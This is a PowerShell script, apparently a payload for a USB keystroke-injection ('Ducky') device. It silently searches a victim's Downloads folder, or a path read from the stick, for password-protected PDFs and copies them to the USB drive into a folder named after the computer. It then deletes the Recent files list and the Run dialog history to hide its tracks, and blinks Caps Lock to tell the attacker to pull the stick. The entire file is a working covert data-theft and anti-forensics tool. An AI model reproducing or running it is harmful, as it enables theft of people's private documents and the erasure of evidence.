#Author: Siemiątkowski Mateusz
 
#Check the volume letter of DUCKY and create folder on it with the same name as the computer, if does not exists already 
$m = (Get-Volume -FileSystemLabel "DUCKY").DriveLetter
$DestDir = "$($m):\$($env:computername)"
if(!(Test-Path $DestDir)) {
    New-Item -Path $DestDir -ItemType Directory | Out-Null
}

#Set the target directory where to look for files
$TargetFile = "$($m):\target.txt"
if(Test-Path $TargetFile) {
    $Source = Get-Content $TargetFile -Raw
    if(!(Test-Path $Source)) {
        $Source = "$env:USERPROFILE\Downloads"
    
    }
}
else {
    $Source = "$env:USERPROFILE\Downloads"
}

#Params for Get-ChildItem
$GCI_Params = @{
    Path = $Source
    Filter = "*pdf"
    Recurse = $true
    ErrorAction = 'SilentlyContinue'
    Force = $true
}

#Params for Copy-Item
$CI_Params = @{
    Destination = $DestDir
    Force = $true
}

#Look for pdf files in target directory and copy those that are protected by password
Get-ChildItem @GCI_Params | Where-Object { Select-String -Path $_.FullName -Pattern "/Encrypt" -Quiet } | Copy-Item @CI_Params

###
###    Clean as to not leave any traces 
###

$RI_Params = @{
    Path = "$env:APPDATA\Microsoft\Windows\Recent\*"
    Recurse = $true
    Force = $true
    ErrorAction = 'SilentlyContinue'
}

$RIP_Params = @{
    Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Name = "*"
    ErrorAction = 'SilentlyContinue'
}

#Clean recently used file in file explorer
Remove-Item  @RI_Params

#Clean history of run window
Remove-ItemProperty @RIP_PARAMS

#To signal that you can safely remove the USB DUCKY
$wsh = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 6; $i++) {
    $wsh.SendKeys('{CAPSLOCK}')
    Start-Sleep -Milliseconds 300
}
